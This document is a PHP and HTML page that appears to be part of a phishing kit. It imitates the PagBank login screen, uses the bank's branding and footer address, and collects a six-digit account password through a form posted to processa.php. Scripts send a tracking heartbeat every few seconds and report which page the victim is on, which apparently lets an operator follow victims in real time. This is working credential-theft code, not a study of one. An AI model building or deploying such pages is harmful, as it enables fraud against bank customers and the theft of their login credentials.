<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

    html, body {
      height: 100%;
      display: flex;
      flex-direction: column;
      background: #fff;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 60px;
      border-bottom: 1px solid #ddd;
    }

    .flag {
      font-size: 14px;
      padding: 6px 16px;
      border-radius: 24px;
      background: #f5f5f5;
      border: 1px solid #ccc;
      display: flex;
      align-items: center;
      gap: 6px;
      margin-right: 390px;
    }

    .wrapper {
      display: flex;
      flex-direction: column;
      flex: 1;
    }

    .main {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 60px;
      gap: 80px;
    }

    .left {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 20px;
    }

    .right {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }

    .banner-wrapper {
      display: flex;
      gap: 40px;
    }

    .banner-wrapper img {
      width: 300px;
    }

    .text-block {
      max-width: 360px;
      margin-top: 55px;
    }

    .text-block h2 {
      font-size: 20px;
      margin-bottom: 14px;
      color: #000;
    }

    .text-block p {
      font-size: 15px;
      color: #333;
      line-height: 1.5;
    }

    .store-area {
      margin-top: 10px;
      display: flex;
      align-items: center;
    }

    .store-caption {
      font-size: 14px;
      color: #444;
      white-space: nowrap;
    }

    .store-buttons {
      display: flex;
      gap: 0px;
      margin-left: 15px;
    }

    .store-buttons img {
      height: 40px;
      cursor: pointer;
    }

    .senha-box {
      width: 360px;
      border: 1px solid #ccc;
      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
      border-radius: 4px;
      padding: 28px 24px;
      margin-bottom: 10px;
    }

    .senha-box h3 {
      font-size: 16px;
      color: #000;
      margin-bottom: 6px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .senha-box .info-icon {
      width: 18px;
      height: 18px;
      stroke: #007fc7;
    }

    .senha-box .subinfo {
      font-size: 13px;
      color: #555;
      margin-bottom: 20px;
    }

    .password-inputs {
      display: flex;
      gap: 6px;
      margin-bottom: 20px;
      justify-content: flex-start;
    }

    .password-inputs input {
      width: 32px;
      height: 50px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #aaa;
      border-radius: 8px;
      caret-color: transparent;
    }

    .password-inputs input:focus {
      outline: 2px solid #007fc7;
      caret-color: auto;
    }

    .eye {
      position: absolute;
      right: 50px;
      top: 12px;
      width: 20px;
      height: 20px;
      cursor: pointer;
    }

    .btn-primary {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .link {
      display: block;
      margin-top: 12px;
      font-size: 14px;
      text-align: center;
      color: #007fc7;
      text-decoration: none;
    }

    .trocar {
      font-size: 13px;
      color: #007fc7;
      text-decoration: none;
      float: right;
      margin-top: -3px;
    }

    .password-container {
      position: relative;
    }

    .comunicar-wrapper {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      padding-left: 24px;
      margin-top: 10px;
    }

    .comunicar {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #333;
      gap: 8px;
      padding-bottom: 4px;
    }

    .comunicar img {
      width: 20px;
      height: 20px;
    }

    .comunicar .seta {
      color: #007fc7;
      font-weight: bold;
      font-size: 18px;
      margin-left: 4px;
    }

    .linha-inferior {
      height: 1px;
      background-color: #ccc;
      width: 300px;
      margin: 10px 0;
    }

    .recaptcha {
    font-size: 12px;
    color: #555;
    text-align: center;
    margin: 0 auto 16px;
    width: 300px;
    }



    .recaptcha a {
      color: #007fc7;
      text-decoration: none;
      margin: 0 4px;
    }

    footer.rodape {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
    }

    footer.rodape img {
      height: 28px;
      margin-bottom: 10px;
    }

    footer.rodape p {
      margin: 4px 0;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-bottom: 14px;
      cursor: pointer;
    }

    .info-icon {
      width: 30px;
      height: 30px;
      background: url('imagens/info.svg') no-repeat center center;
      background-size: contain;
      display: inline-block;
      margin-left: 6px;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="flag">
      PT
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#007fc7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="6 9 12 15 18 9" />
      </svg>
    </div>
  </div>

  <div class="wrapper">
    <div class="main">
      <div class="left">
        <div class="banner-wrapper">
          <img src="imagens/banner.png" alt="Banner PagBank">
          <div class="text-block">
            <h2>CDB que rende muito <br> mais que a poupança + <br> cartão de crédito grátis.</h2>
            <p>Enquanto seu dinheiro rende, você <br> usa o limite no cartão de crédito e <br> resgata quando quiser. Sem <br> análise de crédito, inclusive para <br> negativados.</p>
          </div>
        </div>

        <div class="store-area">
          <div class="store-caption">Baixe o aplicativo</div>
          <div class="store-buttons">
            <img src="imagens/app-store.svg" alt="App Store">
            <img src="imagens/google-play.svg" alt="Google Play">
          </div>
        </div>
      </div>

      <div class="right">
      <div class="senha-box">
        <form action="processa.php" method="POST">
          <div class="title-row">
            <h2>Digite sua senha</h2>
            <span class="info-icon"></span>
          </div>

          <div class="subinfo">
            Sua conta <br>
            <strong><?php echo $_SESSION['identificador'] ?? ''; ?></strong>
            <a class="trocar" href="login-desktop.php">Trocar</a>
          </div>

          <div class="password-container">
            <div class="password-inputs">
              <?php for ($i = 0; $i < 6; $i++): ?>
                <input maxlength="1" type="password" name="senha[]" required inputmode="numeric" pattern="[0-9]*" />
              <?php endfor; ?>
              <img src="imagens/eye-closed.svg" alt="Ver senha" class="eye" id="eyeToggle" onclick="toggleSenha()">
            </div>
          </div>

          <button type="submit" class="btn-primary">Entrar</button>
          <a href="#" class="link">Esqueceu sua senha?</a>
        </form>
      </div>


        <div class="comunicar-wrapper">
        <div class="comunicar">
            <img src="imagens/icon-phone.svg" alt="">
            <span>Comunicar perda ou roubo de celular</span>
            <span class="seta">›</span>
        </div>
        <div class="linha-inferior"></div>
        </div>

        <div class="recaptcha">
        Protegido por reCAPTCHA.<br>
        <a href="#">Privacidade</a> e <a href="#">Termos de Serviço</a>
        </div>

        </div>
      </div>
    </div>
  </div>

  <footer class="rodape">
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
  </footer>

  <script>
  let visivel = false;

  function toggleSenha() {
    const campos = document.querySelectorAll('.password-inputs input');
    const eyeIcon = document.getElementById('eyeToggle');
    visivel = !visivel;

    campos.forEach(input => {
      input.type = visivel ? 'text' : 'password';
    });

    // Altera o ícone do olho
    eyeIcon.src = visivel ? 'imagens/eye-blue.svg' : 'imagens/eye-closed.svg';
  }

  document.querySelectorAll('.password-inputs input').forEach((input, index, inputs) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  document.addEventListener("DOMContentLoaded", function () {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/.test(userAgent);

    // Redireciona automaticamente para a versão mobile, se aplicável
    if (isMobile && window.location.pathname.includes("senha-desktop.php")) {
      window.location.href = "senha.php";
    }

    if (!isMobile && window.location.pathname.includes("senha.php")) {
      window.location.href = "senha-desktop.php";
    }
  });
</script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'senha-desktop.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
</body>
</html>
